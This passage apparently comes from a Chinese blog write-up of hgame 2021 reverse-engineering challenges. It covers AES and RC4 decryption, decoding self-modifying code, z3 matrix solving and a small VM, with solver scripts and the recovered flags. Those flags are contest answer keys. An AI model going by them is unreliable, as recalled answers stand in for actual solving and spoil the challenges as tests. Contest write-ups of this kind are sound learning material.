2b0c5e6a3a20b189</span><br></pre></td></tr></table></figure><p>第二处开启了另一个线程，利用了第一次检测的输入值异或一次后作为秘钥，进行CBC模式的AES加密，初始向量为0-15</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;2b0c5e6a3a20b189&#x27;</span></span><br><span class="line">key = <span class="built_in">bytes</span>(<span class="built_in">ord</span>(key[i])^i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>))</span><br><span class="line">Cipher = <span class="built_in">bytes</span>([<span class="number">183</span>, <span class="number">254</span>, <span class="number">254</span>, <span class="number">217</span>, <span class="number">7</span>, <span class="number">118</span>, <span class="number">121</span>, <span class="number">101</span>, <span class="number">63</span>, <span class="number">78</span>, <span class="number">95</span>, <span class="number">98</span>, <span class="number">213</span>, <span class="number">2</span>, <span class="number">246</span>, <span class="number">126</span>])</span><br><span class="line">iv = <span class="built_in">bytes</span>(i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">Plain = aes.decrypt(Cipher)</span><br><span class="line"><span class="built_in">print</span>(Plain)</span><br><span class="line"><span class="comment">#  7a4ad6c5671fb313</span></span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210326202758851.png"></p><h3 id="app-release"><a href="#app-release" class="headerlink" title="app-release"></a>app-release</h3><p>不熟悉安卓，但是经过一系列网上找资料后查到了如何逆向APK代码，过程很简单，就是将KEY进行sha256计算成16位的key，进行AES加密后在进行base64编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">string = <span class="string">b&#x27;A_HIDDEN_KEY&#x27;</span></span><br><span class="line">flag = <span class="string">b&#x27;EEB23sI1Wd9Gvhvk1sgWyQZhjilnYwCi5au1guzOaIg5dMAj9qPA7lnIyVoPSdRY&#x27;</span></span><br><span class="line"></span><br><span class="line">key = hashlib.sha256(string).digest()</span><br><span class="line">iv = hashlib.md5(string).digest()</span><br><span class="line">Cipher = base64.b64decode(flag)</span><br><span class="line"></span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">Plain = aes.decrypt(Cipher)</span><br><span class="line"><span class="built_in">print</span>(Plain)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;jUst_A_3z4pp_write_in_k07l1n&#125;</span></span><br></pre></td></tr></table></figure><h2 id="RE-week3"><a href="#RE-week3" class="headerlink" title="RE-week3"></a>RE-week3</h2><p>第三周只做出来一道题</p><h3 id="FAKE"><a href="#FAKE" class="headerlink" title="FAKE"></a>FAKE</h3><p>简单的smc，函数sub_40699B进行了代码解密工作，首先用idaPython将加密后的代码解码便于静态分析</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210326211521963.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">addr1 = <span class="number">0x0000000000401216</span></span><br><span class="line">addr2 = <span class="number">0x0000000000409080</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1086</span>):</span><br><span class="line">    x = get_byte(addr1+i)</span><br><span class="line">    y = get_byte(addr2+i)</span><br><span class="line">    patch_byte(addr1+i,x^y)</span><br></pre></td></tr></table></figure><p>解密后的关键代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">input = (<span class="keyword">char</span> *)CmpData;</span><br><span class="line"><span class="built_in">memset</span>(CmpData, <span class="number">0</span>, <span class="number">0x90</span>uLL);</span><br><span class="line">v38[<span class="number">0</span>] = <span class="number">55030</span>;</span><br><span class="line">v38[<span class="number">1</span>] = <span class="number">61095</span>;</span><br><span class="line">v38[<span class="number">2</span>] = <span class="number">60151</span>;</span><br><span class="line">v38[<span class="number">3</span>] = <span class="number">57247</span>;</span><br><span class="line">v38[<span class="number">4</span>] = <span class="number">56780</span>;</span><br><span class="line">v38[<span class="number">5</span>] = <span class="number">55726</span>;</span><br><span class="line">v38[<span class="number">6</span>] = <span class="number">46642</span>;</span><br><span class="line">v38[<span class="number">7</span>] = <span class="number">52931</span>;</span><br><span class="line">v38[<span class="number">8</span>] = <span class="number">53580</span>;</span><br><span class="line">v38[<span class="number">9</span>] = <span class="number">50437</span>;</span><br><span class="line">v38[<span class="number">10</span>] = <span class="number">50062</span>;</span><br><span class="line">v38[<span class="number">11</span>] = <span class="number">44186</span>;</span><br><span class="line">v38[<span class="number">12</span>] = <span class="number">44909</span>;</span><br><span class="line">v38[<span class="number">13</span>] = <span class="number">46490</span>;</span><br><span class="line">v38[<span class="number">14</span>] = <span class="number">46024</span>;</span><br><span class="line">v38[<span class="number">15</span>] = <span class="number">44347</span>;</span><br><span class="line">v38[<span class="number">16</span>] = <span class="number">43850</span>;</span><br><span class="line">v38[<span class="number">17</span>] = <span class="number">44368</span>;</span><br><span class="line">v38[<span class="number">18</span>] = <span class="number">54990</span>;</span><br><span class="line">v38[<span class="number">19</span>] = <span class="number">61884</span>;</span><br><span class="line">v38[<span class="number">20</span>] = <span class="number">61202</span>;</span><br><span class="line">v38[<span class="number">21</span>] = <span class="number">58139</span>;</span><br><span class="line">v38[<span class="number">22</span>] = <span class="number">57730</span>;</span><br><span class="line">v38[<span class="number">23</span>] = <span class="number">54964</span>;</span><br><span class="line">v38[<span class="number">24</span>] = <span class="number">48849</span>;</span><br><span class="line">v38[<span class="number">25</span>] = <span class="number">51026</span>;</span><br><span class="line">v38[<span class="number">26</span>] = <span class="number">49629</span>;</span><br><span class="line">v38[<span class="number">27</span>] = <span class="number">48219</span>;</span><br><span class="line">v38[<span class="number">28</span>] = <span class="number">47904</span>;</span><br><span class="line">v38[<span class="number">29</span>] = <span class="number">50823</span>;</span><br><span class="line">v38[<span class="number">30</span>] = <span class="number">46596</span>;</span><br><span class="line">v38[<span class="number">31</span>] = <span class="number">50517</span>;</span><br><span class="line">v38[<span class="number">32</span>] = <span class="number">48421</span>;</span><br><span class="line">v38[<span class="number">33</span>] = <span class="number">46143</span>;</span><br><span class="line">v38[<span class="number">34</span>] = <span class="number">46102</span>;</span><br><span class="line">v38[<span class="number">35</span>] = <span class="number">46744</span>;</span><br><span class="line">v37[<span class="number">0</span>] = <span class="string">&#x27;h&#x27;</span>;</span><br><span class="line">v37[<span class="number">1</span>] = <span class="string">&#x27;g&#x27;</span>;</span><br><span class="line">v37[<span class="number">2</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">v37[<span class="number">3</span>] = <span class="string">&#x27;m&#x27;</span>;</span><br><span class="line">v37[<span class="number">4</span>] = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">v37[<span class="number">5</span>] = <span class="string">&#x27;&#123;&#x27;</span>;</span><br><span class="line">v37[<span class="number">6</span>] = <span class="string">&#x27;@&#x27;</span>;</span><br><span class="line">v37[<span class="number">7</span>] = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">v37[<span class="number">8</span>] = <span class="string">&#x27;F&#x27;</span>;</span><br><span class="line">v37[<span class="number">9</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">v37[<span class="number">10</span>] = <span class="string">&#x27;K&#x27;</span>;</span><br><span class="line">v37[<span class="number">11</span>] = <span class="string">&#x27;E&#x27;</span>;</span><br><span class="line">v37[<span class="number">12</span>] = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">v37[<span class="number">13</span>] = <span class="string">&#x27;f&#x27;</span>;</span><br><span class="line">v37[<span class="number">14</span>] = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line">v37[<span class="number">15</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">v37[<span class="number">16</span>] = <span class="string">&#x27;g&#x27;</span>;</span><br><span class="line">v37[<span class="number">17</span>] = <span class="string">&#x27;!&#x27;</span>;</span><br><span class="line">v37[<span class="number">18</span>] = <span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">v37[<span class="number">19</span>] = <span class="string">&#x27;d&#x27;</span>;</span><br><span class="line">v37[<span class="number">20</span>] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">v37[<span class="number">21</span>] = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">v37[<span class="number">22</span>] = <span class="string">&#x27;Y&#x27;</span>;</span><br><span class="line">v37[<span class="number">23</span>] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">v37[<span class="number">24</span>] = <span class="string">&#x27;u&#x27;</span>;</span><br><span class="line">v37[<span class="number">25</span>] = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">v37[<span class="number">26</span>] = <span class="string">&#x27;k&#x27;</span>;</span><br><span class="line">v37[<span class="number">27</span>] = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">v37[<span class="number">28</span>] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">v37[<span class="number">29</span>] = <span class="string">&#x27;w&#x27;</span>;</span><br><span class="line">v37[<span class="number">30</span>] = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">v37[<span class="number">31</span>] = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">v37[<span class="number">32</span>] = <span class="string">&#x27;M&#x27;</span>;</span><br><span class="line">v37[<span class="number">33</span>] = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">v37[<span class="number">34</span>] = <span class="string">&#x27;?&#x27;</span>;</span><br><span class="line">v37[<span class="number">35</span>] = <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">v44 = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">5</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">5</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">LODWORD</span>(input) = CmpData[<span class="number">6</span> * i + j] + v37[<span class="number">6</span> * k + j] * *(_DWORD *)&amp;a1[<span class="number">24</span> * i + <span class="number">4</span> * k];</span><br><span class="line">      CmpData[<span class="number">6</span> * i + j] = (<span class="keyword">int</span>)input;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察后发现就是一个6*6的矩阵运算，z3解之</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">res = [ <span class="number">55030</span>, <span class="number">61095</span>, <span class="number">60151</span>, <span class="number">57247</span>, <span class="number">56780</span>, <span class="number">55726</span>, <span class="number">46642</span>, <span class="number">52931</span>, <span class="number">53580</span>, <span class="number">50437</span>, <span class="number">50062</span>, <span class="number">44186</span>, <span class="number">44909</span>, <span class="number">46490</span>, <span class="number">46024</span>, <span class="number">44347</span>, <span class="number">43850</span>, <span class="number">44368</span>, <span class="number">54990</span>, <span class="number">61884</span>, <span class="number">61202</span>, <span class="number">58139</span>, <span class="number">57730</span>, <span class="number">54964</span>, <span class="number">48849</span>, <span class="number">51026</span>, <span class="number">49629</span>, <span class="number">48219</span>, <span class="number">47904</span>, <span class="number">50823</span>, <span class="number">46596</span>, <span class="number">50517</span>, <span class="number">48421</span>, <span class="number">46143</span>, <span class="number">46102</span>, <span class="number">46744</span> ]</span><br><span class="line">x = [BitVec(<span class="string">&quot;x_%d&quot;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>)]</span><br><span class="line">y = [<span class="number">104</span>,<span class="number">103</span>,<span class="number">97</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">123</span>,<span class="number">64</span>,<span class="number">95</span>,<span class="number">70</span>,<span class="number">65</span>,<span class="number">75</span>,<span class="number">69</span>,<span class="number">95</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">33</span>,<span class="number">45</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">95</span>,<span class="number">89</span>,<span class="number">48</span>,<span class="number">117</span>,<span class="number">95</span>,<span class="number">107</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">119</span>,<span class="number">95</span>,<span class="number">83</span>,<span class="number">77</span>,<span class="number">67</span>,<span class="number">63</span>,<span class="number">125</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        key=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">            key += y[<span class="number">6</span>*n+j]*x[<span class="number">6</span>*i+n]</span><br><span class="line">        <span class="comment">#print(i*6+j)</span></span><br><span class="line">        s.add(key == res[i*<span class="number">6</span>+j])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">        char = s.model().<span class="built_in">eval</span>(x[i]).as_long()</span><br><span class="line">        flag += <span class="built_in">chr</span>(char)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;E@sy_Se1f-Modifying_C0oodee33&#125;</span></span><br></pre></td></tr></table></figure><h3 id="helloRE3"><a href="#helloRE3" class="headerlink" title="helloRE3"></a>helloRE3</h3><p>这道题没有搞出来，后面看wp复现，对于windows消息机制以及带界面的程序逆向不熟悉。</p><p>在点击Check时，Dbgview显示order为65并且显示输入长度。</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210327204733340.png"></p><p>打开ida搜索字符串player找到对应函数，发现有一处 == 65的判定，会给一个值复制为1，x交叉引用发现一只一个函数调用了该全区变量</p><p>但是会提示函数无法f5，因为栈指针不平衡。</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210327204821903.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210327205121970.png"></p><p>找到对应的地址，发现有call pop结构，目的是为了将call指令的下一条地址送入rax寄存器中，这里将rax设置为0x00007FF708DE8C3E作为下面rc4加密的秘钥。修复栈指针查看伪代码。<img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210327205950305.png" alt="image-20210327205950305"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210327210024334.png"></p><p>加密流程比较简单，order中的数值取反，RC4加密，比较，RC4的key长度为20，值为地址0x00007FF708DE8C3E处开始的硬编码</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210327210113633.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python解密脚本</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_rc4</span>():</span></span><br><span class="line">    Cipher = <span class="built_in">bytes</span>([<span class="number">77</span>, <span class="number">175</span>, <span class="number">39</span>, <span class="number">173</span>, <span class="number">225</span>, <span class="number">236</span>, <span class="number">109</span>, <span class="number">218</span>, <span class="number">240</span>, <span class="number">49</span>, <span class="number">94</span>, <span class="number">154</span>, <span class="number">158</span>, <span class="number">41</span>, <span class="number">250</span>, <span class="number">190</span>, <span class="number">107</span>, <span class="number">8</span>, <span class="number">200</span>, <span class="number">73</span>])</span><br><span class="line">    Key = <span class="built_in">bytes</span>([<span class="number">144</span>, <span class="number">144</span>, <span class="number">88</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">69</span>, <span class="number">208</span>, <span class="number">101</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">139</span>, <span class="number">64</span>, <span class="number">2</span>])</span><br><span class="line">    rc4 = ARC4.new(Key)</span><br><span class="line">    Plain = rc4.decrypt(Cipher)</span><br><span class="line"></span><br><span class="line">    Plain = <span class="built_in">list</span>(<span class="number">0xff</span>^i <span class="keyword">for</span> i <span class="keyword">in</span> Plain)</span><br><span class="line">    <span class="keyword">return</span> Plain</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_in_order</span>(<span class="params">Plain</span>):</span></span><br><span class="line">    order = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,<span class="number">33</span>)]+[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>,<span class="number">50</span>)]+[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">54</span>,<span class="number">76</span>)]</span><br><span class="line">    name = <span class="built_in">list</span>(<span class="string">&#x27;1234567890-+QWERTYUIOP&#123;&#125;|ASDFGHJKL;\&#x27;~ZXCVBNM,./&#x27;</span>)</span><br><span class="line">    key = <span class="built_in">dict</span>(<span class="built_in">zip</span>(order,name)) <span class="comment"># 生成对应的字典</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> Plain:</span><br><span class="line">        flag += key[i]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">find_in_order(decrypt_rc4())</span><br><span class="line"></span><br><span class="line"><span class="comment"># HGAME&#123;6-K4K.4R+3C4T&#125;</span></span><br></pre></td></tr></table></figure><h2 id="RE-week4"><a href="#RE-week4" class="headerlink" title="RE-week4"></a>RE-week4</h2><h3 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h3><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210326203838665.png"></p><p>看似很复杂，其实是输入单个字节的加解密，经过动态调试后发现只有异或和减操作，分别对应到的虚拟机指令是4和7，过程为将输入送入vm_eax寄存器，vm_ebx寄存器中是生成的操作数，动态调试即可获得。</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210326203955786.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210326204041935.png"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> cipher[] = &#123; <span class="number">9</span>, <span class="number">230</span>, <span class="number">79</span>, <span class="number">183</span>, <span class="number">219</span>, <span class="number">46</span>, <span class="number">130</span>, <span class="number">173</span>, <span class="number">232</span>, <span class="number">54</span>, <span class="number">118</span>, <span class="number">198</span>, <span class="number">240</span>, <span class="number">23</span>, <span class="number">103</span>, <span class="number">162</span>, <span class="number">247</span>, <span class="number">231</span>, <span class="number">74</span>, <span class="number">122</span>, <span class="number">235</span>, <span class="number">244</span>, <span class="number">58</span>, <span class="number">112</span>, <span class="number">237</span>, <span class="number">36</span>, <span class="number">2</span>, <span class="number">126</span>, <span class="number">175</span>, <span class="number">246</span>, <span class="number">59</span>, <span class="number">128</span>, <span class="number">191</span>, <span class="number">207</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> Xor[] = &#123; <span class="number">0xfe</span>,<span class="number">0x21</span>,<span class="number">0x44</span>,<span class="number">0x67</span>,<span class="number">0x8a</span>,<span class="number">0xad</span>,<span class="number">0xd0</span>,<span class="number">0xf3</span>,<span class="number">0x16</span>,<span class="number">0x39</span>,<span class="number">0x5c</span>,<span class="number">0x7f</span>,<span class="number">0xa3</span>,<span class="number">0xc5</span>,<span class="number">0xe8</span>,<span class="number">0x0b</span>,<span class="number">0x2e</span>,<span class="number">0x51</span>,<span class="number">0x74</span>,<span class="number">0x97</span>,<span class="number">0xba</span>,<span class="number">0xdd</span>,<span class="number">0x0</span>,<span class="number">0x23</span>,<span class="number">0x46</span>,<span class="number">0x69</span>,<span class="number">0x8c</span>,<span class="number">0xaf</span>,<span class="number">0xd2</span>,<span class="number">0xf5</span>,<span class="number">0x18</span>,<span class="number">0x3b</span>,<span class="number">0x5e</span>,<span class="number">0x81</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> Sub[] = &#123; <span class="number">0x7A</span>,<span class="number">0x1A</span>,<span class="number">0xBA</span>,<span class="number">0x5A</span>,<span class="number">0xFA</span>,<span class="number">0x9A</span>,<span class="number">0x3A</span>,<span class="number">0xDA</span>,<span class="number">0x7A</span>,<span class="number">0x1A</span>,<span class="number">0xBA</span>,<span class="number">0x5A</span>,<span class="number">0xFB</span>,<span class="number">0x9A</span>,<span class="number">0x3A</span>,<span class="number">0xDA</span>,<span class="number">0x7A</span>,<span class="number">0x1A</span>,<span class="number">0xBA</span>,<span class="number">0x5A</span>,<span class="number">0xFA</span>,<span class="number">0x9A</span>,<span class="number">0x3A</span>,<span class="number">0xDA</span>,<span class="number">0x7A</span>,<span class="number">0x1A</span>,<span class="number">0xBA</span>,<span class="number">0x5A</span>,<span class="number">0xFA</span>,<span class="number">0x9A</span>,<span class="number">0x3A</span>,<span class="number">0xDA</span>,<span class="number">0x7A</span>,<span class="number">0x1A</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">33</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (cipher[i] + Sub[i]) ^ Xor[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hgame&#123;w0W!itS_CpP_wItH_little_vM!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="AFiveSecondChallenge"><a href="#AFiveSecondChallenge" class="headerlink" title="AFiveSecondChallenge"></a>AFiveSecondChallenge</h3><p>比赛时没有做出来，对于c#不熟悉，即使主办方在最后放出了白给Hint，还是搞不出矩阵来，看wp慢慢复现。</p><p>首先这是一个扫雷游戏，用c#写的，扫雷的逻辑题目中说明的是通过矩阵运算，所以直接用C#反编译器看看能不能直接搞到源码。但是发现矩阵运算函数被动过手脚。</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210329191243753.png"></p><p>matrix中的数据很多，根据官方给的提示下载文件中给出了il2cppOutPut文件中有两个重要文件<code>AFiveSecondChallenge</code>和<code>Assembly-CSharp</code>，这两个文件中有游戏中的所有逻辑。这里只分析<code>CheckBombAt</code>函数。</p><p>在<code>Assembly-CSharp</code>文件中看到了这些注释，CheckBombAt函数只有一个参数叫<code>Vector2</code>，向量中存储的是数组的坐标，但是matrix数组是一个三维数组，但是这个向量中只存储了x和y坐标。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">System.Boolean AFiveSecondChallenge.BombChecker::CheckBombAt(UnityEngine.Vector2)</span><br><span class="line">    </span><br><span class="line">BombChecker.CheckBombAt(_position)</span><br><span class="line">    </span><br><span class="line">BombChecker.CheckBombAt(new Vector2(x - 1, y - 1))</span><br></pre></td></tr></table></figure><p>在看<code>AFiveSecondChallenge.cpp</code>文件，直接搜索CheckBomAt关键字，定位到该函数。发现了矩阵与运算的主要逻辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Vector2_tA85D2DD88578276CA8A8796756458277E72D073D  L_21 = ___vec0; // 循环时的变量</span><br><span class="line">float L_22 = L_21.get_x_0();</span><br><span class="line">V_2 = (((double)((double)((float)il2cpp_codegen_subtract((float)(fmodf(L_22, (3.0f))), (float)(1.0f))))));</span><br><span class="line">double L_23 = V_2; </span><br><span class="line">double 